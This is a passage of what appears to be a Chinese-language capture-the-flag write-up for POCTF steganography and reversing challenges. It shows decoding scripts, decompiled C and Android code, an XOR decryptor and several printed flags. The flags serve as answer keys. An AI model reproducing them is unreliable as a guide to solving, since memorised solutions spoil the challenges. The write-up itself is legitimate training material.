</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>b</span> <span class=o>==</span> <span class=mh>0x2E</span><span class=p>:</span>  <span class=c1># 遇到句号 &#39;.&#39;</span>
</span></span><span class=line><span class=cl>            <span class=n>inside</span> <span class=o>=</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl>            <span class=n>temp</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>b</span> <span class=o>==</span> <span class=mh>0x0A</span><span class=p>:</span>  <span class=c1># 遇到换行</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>inside</span> <span class=ow>and</span> <span class=n>temp</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=c1># 提取其中的空白字符</span>
</span></span><span class=line><span class=cl>                <span class=k>for</span> <span class=n>c</span> <span class=ow>in</span> <span class=n>temp</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=k>if</span> <span class=n>c</span> <span class=o>==</span> <span class=mh>0x20</span><span class=p>:</span>      <span class=c1># 空格</span>
</span></span><span class=line><span class=cl>                        <span class=n>bits</span> <span class=o>+=</span> <span class=s2>&#34;0&#34;</span>
</span></span><span class=line><span class=cl>                    <span class=k>elif</span> <span class=n>c</span> <span class=o>==</span> <span class=mh>0x09</span><span class=p>:</span>    <span class=c1># Tab</span>
</span></span><span class=line><span class=cl>                        <span class=n>bits</span> <span class=o>+=</span> <span class=s2>&#34;1&#34;</span>
</span></span><span class=line><span class=cl>                <span class=n>bits</span> <span class=o>+=</span> <span class=s2>&#34; &#34;</span>
</span></span><span class=line><span class=cl>            <span class=n>inside</span> <span class=o>=</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>inside</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>temp</span> <span class=o>+=</span> <span class=nb>bytes</span><span class=p>([</span><span class=n>b</span><span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>bits</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>bits</span> <span class=o>=</span> <span class=n>extract_between_dot_and_newline</span><span class=p>(</span><span class=s2>&#34;leaflet.txt&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 转换为字符串</span>
</span></span><span class=line><span class=cl><span class=n>bin_data</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>bits</span><span class=o>.</span><span class=n>split</span><span class=p>())</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>bin_data</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>decoded</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span>
</span></span><span class=line><span class=cl>    <span class=nb>chr</span><span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=n>bin_data</span><span class=p>[</span><span class=n>i</span><span class=p>:</span><span class=n>i</span><span class=o>+</span><span class=mi>8</span><span class=p>],</span> <span class=mi>2</span><span class=p>))</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>bin_data</span><span class=p>),</span> <span class=mi>8</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>decoded</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=stego-100-3-low-tide-at-midnight>Stego 100-3 Low Tide at Midnight</h2><p>使用stegsolve调一下通道</p><p>再手动恢复一下</p><p><img src=https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Picimage-20251104195209-pz04da4.png alt=image></p><p>使用stegsolve调一下通道</p><p>再手动恢复一下</p><p>微信一扫就出来了</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>poctf<span class=o>{</span>uwsp_f0r3v3r_bl0w1n6_bubbl35<span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><h1 id=reversing>Reversing</h1><h2 id=reverse-100-1-seven-easy-pieces>Reverse 100-1 Seven Easy Pieces</h2><p><img src=https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Picimage-20251104202805-smlxgiz.png alt=image></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>arr</span> <span class=o>=</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>    <span class=mh>0x47</span><span class=p>,</span><span class=mh>0x58</span><span class=p>,</span><span class=mh>0x54</span><span class=p>,</span><span class=mh>0x43</span><span class=p>,</span><span class=mh>0x51</span><span class=p>,</span><span class=mh>0x4C</span><span class=p>,</span><span class=mh>0x42</span><span class=p>,</span><span class=mh>0x40</span><span class=p>,</span><span class=mh>0x44</span><span class=p>,</span><span class=mh>0x47</span><span class=p>,</span><span class=mh>0x68</span><span class=p>,</span><span class=mh>0x02</span><span class=p>,</span><span class=mh>0x07</span><span class=p>,</span><span class=mh>0x5A</span><span class=p>,</span><span class=mh>0x04</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=mh>0x68</span><span class=p>,</span><span class=mh>0x51</span><span class=p>,</span><span class=mh>0x5B</span><span class=p>,</span><span class=mh>0x03</span><span class=p>,</span><span class=mh>0x01</span><span class=p>,</span><span class=mh>0x68</span><span class=p>,</span><span class=mh>0x00</span><span class=p>,</span><span class=mh>0x5F</span><span class=p>,</span><span class=mh>0x06</span><span class=p>,</span><span class=mh>0x02</span><span class=p>,</span><span class=mh>0x68</span><span class=p>,</span><span class=mh>0x00</span><span class=p>,</span><span class=mh>0x42</span><span class=p>,</span><span class=mh>0x45</span><span class=p>,</span><span class=mh>0x59</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=mh>0x04</span><span class=p>,</span><span class=mh>0x53</span><span class=p>,</span><span class=mh>0x68</span><span class=p>,</span><span class=mh>0x07</span><span class=p>,</span><span class=mh>0x42</span><span class=p>,</span><span class=mh>0x00</span><span class=p>,</span><span class=mh>0x68</span><span class=p>,</span><span class=mh>0x00</span><span class=p>,</span><span class=mh>0x07</span><span class=p>,</span><span class=mh>0x68</span><span class=p>,</span><span class=mh>0x55</span><span class=p>,</span><span class=mh>0x04</span><span class=p>,</span><span class=mh>0x4A</span>
</span></span><span class=line><span class=cl><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>flag</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=nb>chr</span><span class=p>(</span><span class=n>x</span> <span class=o>^</span> <span class=mh>0x37</span><span class=p>)</span> <span class=k>for</span> <span class=n>x</span> <span class=ow>in</span> <span class=n>arr</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>flag</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=reverse-100-2-left-at-the-light>Reverse 100-2 Left at the Light</h2><p>‍</p><p><img src=https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Picimage-20251104203212-hfa2s1l.png alt=image></p><p>base64解码得到</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>poctf<span class=o>{</span>uwsp_wh33zy_wh15k3r5_4nd_w15py_w1nd5<span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=reverse-100-3-a-tree-of-knives>Reverse 100-3 A Tree of Knives</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>int</span> <span class=kr>__fastcall</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span> <span class=o>**</span><span class=n>argv</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span> <span class=o>**</span><span class=n>envp</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=n>FILE</span> <span class=o>*</span><span class=n>v3</span><span class=p>;</span> <span class=c1>// rax
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>result</span><span class=p>;</span> <span class=c1>// eax
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>char</span> <span class=n>v5</span><span class=p>[</span><span class=mi>264</span><span class=p>];</span> <span class=c1>// [rsp+20h] [rbp-108h] BYREF
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=n>Size</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span> <span class=n>Size</span> <span class=o>&lt;</span> <span class=mh>0x100</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=nf>memcpy</span><span class=p>(</span><span class=n>v5</span><span class=p>,</span> <span class=n>Src</span><span class=p>,</span> <span class=n>Size</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=n>v5</span><span class=p>[</span><span class=n>Size</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=k>return</span> <span class=nf>_mingw_printf</span><span class=p>(</span><span class=s>&#34;Well done. Flag: %s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>v5</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>else</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>v3</span> <span class=o>=</span> <span class=nf>__acrt_iob_func</span><span class=p>(</span><span class=mi>2u</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nf>_mingw_fprintf</span><span class=p>(</span><span class=n>v3</span><span class=p>,</span> <span class=s>&#34;No flag buffer present. Aborting.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=n>result</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p><img src=https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Picimage-20251104204650-sz1tp3t.png alt=image></p><h2 id=reverse-100-4-gremlins-in-the-gears>Reverse 100-4 Gremlins in the Gears</h2><p><img src=https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Picimage-20251104211008-7iniaqa.png alt=image></p><p>upx脱壳就出</p><p><img src=https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Picimage-20251104210945-ibreywi.png alt=image></p><h2 id=reverse-200-1-on-hinge-and-pin>Reverse 200-1 On Hinge and Pin</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kn>package</span><span class=w> </span><span class=nn>com.poctf.onhingeandpin</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>android.content.Context</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.io.IOException</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.io.InputStream</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>kotlin.Metadata</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>kotlin.io.ByteStreamsKt</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>kotlin.io.CloseableKt</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>kotlin.jvm.internal.Intrinsics</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>kotlin.text.Charsets</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>kotlin.text.StringsKt</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=cm>/* compiled from: Crypto.kt */</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=nd>@Metadata</span><span class=p>(</span><span class=n>d1</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>{</span><span class=s>&#34;\u0000\u001c\n\u0002\u0018\u0002\n\u0002\u0010\u0000\n\u0002\b\u0002\n\u0002\u0010\u000e\n\u0002\b\u0002\n\u0002\u0018\u0002\n\u0002\b\u0002\bÆ\u0002\u0018\u00002\u00020\u0001B\u0007\b\u0002¢\u0006\u0002\u0010\u0002J\u0018\u0010\u0005\u001a\u00020\u00042\u0006\u0010\u0006\u001a\u00020\u00072\b\b\u0002\u0010\b\u001a\u00020\u0004R\u000e\u0010\u0003\u001a\u00020\u0004X\u0082T¢\u0006\u0002\n\u0000¨\u0006\t&#34;</span><span class=p>},</span><span class=w> </span><span class=n>d2</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>{</span><span class=s>&#34;Lcom/poctf/onhingeandpin/Crypto;&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;()V&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;KEY&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;loadAndDecrypt&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;ctx&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;Landroid/content/Context;&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;assetName&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;app_debug&#34;</span><span class=p>},</span><span class=w> </span><span class=n>k</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>1</span><span class=p>,</span><span class=w> </span><span class=n>mv</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>{</span><span class=n>1</span><span class=p>,</span><span class=w> </span><span class=n>9</span><span class=p>,</span><span class=w> </span><span class=n>0</span><span class=p>},</span><span class=w> </span><span class=n>xi</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>48</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=cm>/* loaded from: classes3.dex */</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kd>public</span><span class=w> </span><span class=kd>final</span><span class=w> </span><span class=kd>class</span> <span class=nc>Crypto</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kd>final</span><span class=w> </span><span class=n>Crypto</span><span class=w> </span><span class=n>INSTANCE</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Crypto</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kd>final</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>KEY</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;ONOFFONOFF&#34;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=nf>Crypto</span><span class=p>()</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=cm>/* synthetic */</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=nf>loadAndDecrypt$default</span><span class=p>(</span><span class=n>Crypto</span><span class=w> </span><span class=n>crypto</span><span class=p>,</span><span class=w> </span><span class=n>Context</span><span class=w> </span><span class=n>context</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>str</span><span class=p>,</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=n>i</span><span class=p>,</span><span class=w> </span><span class=n>Object</span><span class=w> </span><span class=n>obj</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>((</span><span class=n>i</span><span class=w> </span><span class=o>&amp;</span><span class=w> </span><span class=n>2</span><span class=p>)</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=n>0</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>str</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;enc_flag.bin&#34;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=n>crypto</span><span class=p>.</span><span class=na>loadAndDecrypt</span><span class=p>(</span><span class=n>context</span><span class=p>,</span><span class=w> </span><span class=n>str</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>final</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=nf>loadAndDecrypt</span><span class=p>(</span><span class=n>Context</span><span class=w> </span><span class=n>ctx</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>assetName</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>IOException</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Intrinsics</span><span class=p>.</span><span class=na>checkNotNullParameter</span><span class=p>(</span><span class=n>ctx</span><span class=p>,</span><span class=w> </span><span class=s>&#34;ctx&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Intrinsics</span><span class=p>.</span><span class=na>checkNotNullParameter</span><span class=p>(</span><span class=n>assetName</span><span class=p>,</span><span class=w> </span><span class=s>&#34;assetName&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>InputStream</span><span class=w> </span><span class=n>inputStreamOpen</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>ctx</span><span class=p>.</span><span class=na>getAssets</span><span class=p>().</span><span class=na>open</span><span class=p>(</span><span class=n>assetName</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>try</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>InputStream</span><span class=w> </span><span class=n>it</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>inputStreamOpen</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>Intrinsics</span><span class=p>.</span><span class=na>checkNotNull</span><span class=p>(</span><span class=n>it</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=n>data</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>ByteStreamsKt</span><span class=p>.</span><span class=na>readBytes</span><span class=p>(</span><span class=n>it</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>CloseableKt</span><span class=p>.</span><span class=na>closeFinally</span><span class=p>(</span><span class=n>inputStreamOpen</span><span class=p>,</span><span class=w> </span><span class=kc>null</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=n>key</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>StringsKt</span><span class=p>.</span><span class=na>encodeToByteArray</span><span class=p>(</span><span class=n>KEY</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=n>out</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=kt>byte</span><span class=o>[</span><span class=n>data</span><span class=p>.</span><span class=na>length</span><span class=o>]</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=kt>int</span><span class=w> </span><span class=n>length</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>data</span><span class=p>.</span><span class=na>length</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>for</span><span class=w> </span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>0</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=n>length</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=o>++</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>out</span><span class=o>[</span><span class=n>i</span><span class=o>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=kt>byte</span><span class=p>)</span><span class=w> </span><span class=p>(</span><span class=n>data</span><span class=o>[</span><span class=n>i</span><span class=o>]</span><span class=w> </span><span class=o>^</span><span class=w> </span><span class=n>key</span><span class=o>[</span><span class=n>i</span><span class=w> </span><span class=o>%</span><span class=w> </span><span class=n>key</span><span class=p>.</span><span class=na>length</span><span class=o>]</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>return</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>String</span><span class=p>(</span><span class=n>out</span><span class=p>,</span><span class=w> </span><span class=n>Charsets</span><span class=p>.</span><span class=na>UTF_8</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w> </span><span class=k>finally</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>取出资源文件</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># decrypt_flag.py</span>
</span></span><span class=line><span class=cl><span class=c1># Python 3</span>
</span></span><span class=line><span class=cl><span class=n>KEY</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;ONOFFONOFF&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>decrypt_bytes</span><span class=p>(</span><span class=n>data</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>out</span> <span class=o>=</span> <span class=nb>bytearray</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>data</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span><span class=p>,</span> <span class=n>b</span> <span class=ow>in</span> <span class=nb>enumerate</span><span class=p>(</span><span class=n>data</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>out</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=n>b</span> <span class=o>^</span> <span class=n>KEY</span><span class=p>[</span><span class=n>i</span> <span class=o>%</span> <span class=nb>len</span><span class=p>(</span><span class=n>KEY</span><span class=p>)]</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nb>bytes</span><span class=p>(</span><span class=n>out</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=kn>import</span> <span class=nn>sys</span>
</span></span><span class=line><span class=cl>    <span class=n>fn</span> <span class=o>=</span> <span class=s2>&#34;enc_flag.bin&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=n>fn</span><span class=p>,</span> <span class=s2>&#34;rb&#34;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>data</span> <span class=o>=</span> <span class=n>f</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>FileNotFoundError</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;文件未找到: </span><span class=si>{</span><span class=n>fn</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
